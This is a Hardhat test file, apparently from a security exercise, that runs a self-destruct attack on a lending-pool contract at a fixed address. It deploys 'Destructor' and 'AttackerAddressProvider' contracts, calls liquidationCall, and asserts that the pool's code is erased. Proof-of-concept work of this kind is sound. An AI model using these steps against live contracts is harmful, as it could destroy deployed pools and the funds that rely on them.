const { assert } = require("chai");
const abi = require('./abi.json');

// describe("Pool", function () {
//     let contract;
//     let pool;
//     before(async () => {
//         pool = await ethers.getContractAt(abi, "0x987115C38Fd9Fd2aA2c6F1718451D167c13a3186");

//         const Contract = await ethers.getContractFactory("Contract");
//         contract = await Contract.deploy();
//         await contract.deployed();
//     });

//     it("should have set the addresses provider", async function () {
//         assert.equal(await pool.getAddressesProvider(), contract.address, "expected the addresses provider to be the contract");
//     });

//     it("should have set the lending pool collateral manager", async function () {
//         assert.equal(await contract.getLendingPoolCollateralManager(), contract.address, "expected the lending pool collateral manager to be the contract");
//     });
// });

// 3. Destruct
describe("Pool", function () {
    let attackerAddressProvider;
    let pool;
    before(async () => {
        pool = await ethers.getContractAt(abi, "0x987115C38Fd9Fd2aA2c6F1718451D167c13a3186");

        const Destructor = await ethers.getContractFactory("Destructor");
        let exploit = await Destructor.deploy();
        await exploit.deployed();

        const AttackerAddressProvider = await ethers.getContractFactory("AttackerAddressProvider");
        attackerAddressProvider = await AttackerAddressProvider.deploy();
        await attackerAddressProvider.deployed();
    });

    it("should be deployed", async function () {
        assert.notEqual(await ethers.provider.getCode(pool.address), "0x", "Expected the pool to be deployed");
    });

    describe('after liquidation call', () => {
        before(async () => {
            const z = ethers.constants.AddressZero;
            await pool.liquidationCall(z, z, z, 0, true);
        });

        it("should be destroyed", async function () {
            assert.equal(await ethers.provider.getCode(pool.address), "0x", "Expected the pool to be destroyed");
        });
    });
});

